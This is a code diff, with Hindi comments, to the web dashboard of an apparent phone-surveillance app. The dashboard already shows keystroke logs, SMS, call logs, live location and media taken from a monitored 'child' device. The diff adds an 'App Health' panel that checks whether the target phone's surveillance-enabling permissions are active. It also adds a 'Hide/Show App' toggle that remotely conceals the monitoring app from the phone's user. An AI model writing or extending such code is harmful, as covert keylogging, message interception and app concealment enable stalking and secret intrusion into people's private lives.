@@ -623,6 +623,12 @@
                         <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ce93d8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect><line x1="12" y1="18" x2="12.01" y2="18"></line></svg>
                         <span>Device Status</span>
                     </button>
+
+                    <button class="category-btn" data-category="health">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#e57373" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path></svg>
+                        <span>App Health</span>
+                    </button>
+                    
                     <button class="category-btn" data-category="location">
                         <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="var(--accent-blue)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg>
                         <span>Live Location</span>
@@ -648,14 +654,20 @@
                         <span>SMS</span>
                     </button>
                     <button class="category-btn" data-category="calllogs">
-                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#64b5f6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#64b5f6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81 .7A2 2 0 0 1 22 16.92z"></path></svg>
                         <span>Call Logs</span>
                     </button>
                     <button class="category-btn" data-category="notifications">
                         <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="var(--accent-pink)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>
                         <span>Notifications</span>
                     </button>
-                     <button class="category-btn" data-category="coming-soon" data-feature-name="Screenshot">
+					
+                    <button class="category-btn" data-category="toggleAppVisibility">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#FFD700" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
+                        <span>Hide/Show App</span>
+                        <small id="app-visibility-status" style="margin-top: 8px; font-weight: bold; color: var(--accent-blue);">Status: Loading...</small>
+                    </button>
+                    <button class="category-btn" data-category="coming-soon" data-feature-name="Screenshot">
                         <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21.09 10.59a2.23 2.23 0 0 0-2.2-2.2H5.12a2.23 2.23 0 0 0-2.2 2.2v8.84a2.23 2.23 0 0 0 2.2 2.2h13.78a2.23 2.23 0 0 0 2.2-2.2v-8.84zM6.88 4.71h10.24"></path><line x1="12" y1="2.11" x2="12" y2="4.71"></line></svg>
                         <span>Screenshot</span>
                     </button>
@@ -1035,6 +1047,27 @@
                 mainContentTitle.textContent = `${selectedChildInfo.userName}`; detailsView.style.display = 'block'; liveChatBtn.disabled = false;
                 
                 setupNotificationListener(selectedChildInfo.userId, selectedChildInfo.childKey);
+                
+                // ===============================================================
+                // ### नया कोड (भाग 1) यहाँ जोड़ा गया है ###
+                // ===============================================================
+                // तर्क: यह कोड फायरबेस से ऐप की वर्तमान स्थिति (छिपा हुआ है या नहीं) को सुनता है
+                // और हमारे नए बटन पर स्टेटस टेक्स्ट को अपडेट करता है।
+                const appVisibilityRef = ref(db, `user/${selectedChildInfo.userId}/${selectedChildInfo.childKey}/data/showApp`);
+                onValue(appVisibilityRef, (snapshot) => {
+                    // फायरबेस से मान प्राप्त करें (true या false)
+                    const isVisible = snapshot.val();
+                    const statusElement = document.getElementById('app-visibility-status');
+                    const buttonElement = document.querySelector('[data-category="toggleAppVisibility"]');
+
+                    if (statusElement && buttonElement) {
+                        // स्टेटस टेक्स्ट को अपडेट करें
+                        statusElement.textContent = isVisible ? 'Status: Visible' : 'Status: Hidden';
+                        // स्थिति के आधार पर बटन का बॉर्डर रंग बदलें
+                        buttonElement.style.borderColor = isVisible ? 'var(--accent-green)' : 'var(--accent-red)';
+                    }
+                });
+                // ===============================================================
 
                 if (window.innerWidth <= 992) { sidebar.classList.remove('open'); overlay.style.display = 'none'; }
             }
@@ -1119,6 +1152,36 @@
             const button = e.target.closest('.category-btn');
             if (button) {
                 const category = button.dataset.category;
+
+                // ===============================================================
+                // ### नया कोड (भाग 2) यहाँ जोड़ा गया है ###
+                // ===============================================================
+                // तर्क: जब उपयोगकर्ता Hide/Show App बटन पर क्लिक करता है, तो यह कोड चलता है।
+                if (category === 'toggleAppVisibility') {
+                    const { userId, childKey } = selectedChildInfo;
+                    if (!userId || !childKey) return;
+
+                    // फायरबेस में सही पथ का संदर्भ लें
+                    const appVisibilityRef = ref(db, `user/${userId}/${childKey}/data/showApp`);
+
+                    // पहले फायरबेस से वर्तमान मान प्राप्त करें
+                    get(appVisibilityRef).then((snapshot) => {
+                        const currentVisibility = snapshot.val();
+                        // मान को उल्टा करें (अगर true है तो false, और अगर false है तो true)
+                        const newVisibility = !currentVisibility; 
+                        
+                        // फायरबेस पर नया मान सेट करें
+                        set(appVisibilityRef, newVisibility).then(() => {
+                            // उपयोगकर्ता को सूचित करें कि कमांड भेज दिया गया है
+                            showToast(`Command sent to ${newVisibility ? 'show' : 'hide'} the app.`);
+                        }).catch(error => {
+                            showToast('Error sending command: ' + error.message);
+                        });
+                    });
+                    return; // अन्य क्लिक हैंडलर्स को चलने से रोकने के लिए
+                }
+                // ===============================================================
+
                 if (category === 'coming-soon') { openComingSoonModal(button.dataset.featureName); } else { openDataModal(category); }
             }
         });
@@ -1126,7 +1189,9 @@
         function getSafeCategoryName(category) {
             const nameMap = {
                 'keylogger': 'Keystroke', 'location': 'Location', 'photo': 'Photos', 'sms': 'SMS', 'notifications': 'Notifications', 'devicestatus': 'Device Status', 'calllogs': 'Call Logs',
-                'video': 'Videos', 'audio': 'Audio Recordings'
+                'video': 'Videos', 'audio': 'Audio Recordings',
+                // हिंदी कमेंट: 'health' कैटेगरी के लिए एक सुरक्षित और पठनीय (readable) नाम यहाँ जोड़ा गया है।
+                'health': 'App Health'
             };
             return nameMap[category] || category.charAt(0).toUpperCase() + category.slice(1);
         }
@@ -1221,7 +1286,8 @@
                 modalDataDisplayArea.innerHTML = '<p>No data available.</p>';
                 return;
             }
-            const dataArray = (category !== 'devicestatus' && category !== 'location') ? Object.values(data).reverse() : [];
+            const dataArray = (category !== 'devicestatus' && category !== 'location' && category !== 'health') ? Object.values(data).reverse() : [];
+            
             switch(category) {
                 case 'location':
                     const loc = data; let mapLink = '';
@@ -1256,6 +1322,42 @@
                 case 'devicestatus':
                     const status = data;
                     contentHTML = `<div class="data-card"><div class="data-card-header"><div class="data-card-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-teal)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg></div><div class="data-card-title">Current Device Status</div></div><div class="data-card-body"><div class="status-item" style="flex-direction: column; align-items: flex-start; gap: 0.5rem; padding-bottom: 1.5rem;"><div style="width:100%; display:flex; justify-content: space-between;"><span class="status-item-label">Battery</span><span class="status-item-value">${status.batteryLevel || 'N/A'}%</span></div><div class="battery-level"><div class="battery-level-fill" style="width: ${status.batteryLevel || 0}%;"></div></div></div><div class="status-grid"><div class="status-item"><span class="status-item-label">Internet</span><span class="status-item-value ${status.internetOn ? 'on' : 'off'}">${status.internetOn ? 'On' : 'Off'}</span></div><div class="status-item"><span class="status-item-label">Network Type</span><span class="status-item-value">${status.networkType || 'N/A'}</span></div><div class="status-item"><span class="status-item-label">SIM Operator</span><span class="status-item-value">${status.simOperator || 'N/A'}</span></div><div class="status-item"><span class="status-item-label">SIM 1</span><span class="status-item-value">${status.sim1Number || 'N/A'}</span></div><div class="status-item"><span class="status-item-label">SIM 2</span><span class="status-item-value">${status.sim2Number || 'N/A'}</span></div></div></div><div class="data-card-footer">Last updated: ${new Date(status.lastUpdated).toLocaleString() || 'N/A'}</div></div>`;
+                    break;
+                
+                // हिंदी कमेंट: 'health' डेटा को दिखाने वाले ब्लॉक को नए और बेहतर डिज़ाइन के साथ अपडेट कर दिया गया है।
+                case 'health':
+                    const healthData = data;
+                    
+                    // हिंदी कमेंट: यह फंक्शन परमिशन की स्थिति के अनुसार एक क्लीन दिखने वाला HTML आइटम बनाता है।
+                    const createHealthItem = (label, isEnabled) => {
+                        const icon = isEnabled ? '✅' : '❌';
+                        return `<div class="status-item">
+                                    <span style="color: ${isEnabled ? 'var(--accent-green)' : 'var(--accent-red)'};">${icon}</span>
+                                    <span>${label}</span>
+                                </div>`;
+                    };
+
+                    contentHTML = `<div class="data-card">
+                                    <div class="data-card-body">
+                                        <div style="font-size: 1.1rem; line-height: 1.8; margin-bottom: 2rem;">
+                                            <p><strong>App Version:</strong> ${healthData.appVersion || 'N/A'}</p>
+                                            <p><strong>Last Checked:</strong> ${new Date(healthData.lastCheckedTimestamp).toLocaleString() || 'N/A'}</p>
+                                            <p><strong>Last Heartbeat:</strong> ${new Date(healthData.lastHeartbeatTime).toLocaleString() || 'N/A'}</p>
+                                        </div>
+                                        <h4 style="margin-bottom: 1.5rem; color: #fff; font-size: 1.2rem;">App Health Status</h4>
+                                        <div class="status-grid">
+                                            ${createHealthItem('Accessibility Service', healthData.accessibilityServiceEnabled)}
+                                            ${createHealthItem('Notification Service', healthData.notificationServiceEnabled)}
+                                            ${createHealthItem('Camera Permission', healthData.hasCameraPermission)}
+                                            ${createHealthItem('Microphone Permission', healthData.hasMicrophonePermission)}
+                                            ${createHealthItem('Location Permission', healthData.hasLocationPermission)}
+                                            ${createHealthItem('SMS Permission', healthData.hasSmsPermission)}
+                                            ${createHealthItem('Call Log Permission', healthData.hasCallLogPermission)}
+                                            ${createHealthItem('Draw Over Apps', healthData.hasDrawOverAppsPermission)}
+                                            ${createHealthItem('Ignoring Battery Optimizations', healthData.ignoringBatteryOptimizations)}
+                                        </div>
+                                    </div>
+                                </div>`;
                     break;
             }
             modalDataDisplayArea.innerHTML = contentHTML;
@@ -1421,6 +1523,8 @@
                 case 'devicestatus': return 'DeviceStatus';
                 case 'video': return 'video/data';
                 case 'audio': return 'audio/data';
+                // हिंदी कमेंट: 'health' कैटेगरी के लिए Firebase का सही पाथ यहाँ जोड़ा गया है।
+                case 'health': return 'AppHealthStatus'; 
                 default: return '';
             }
         }
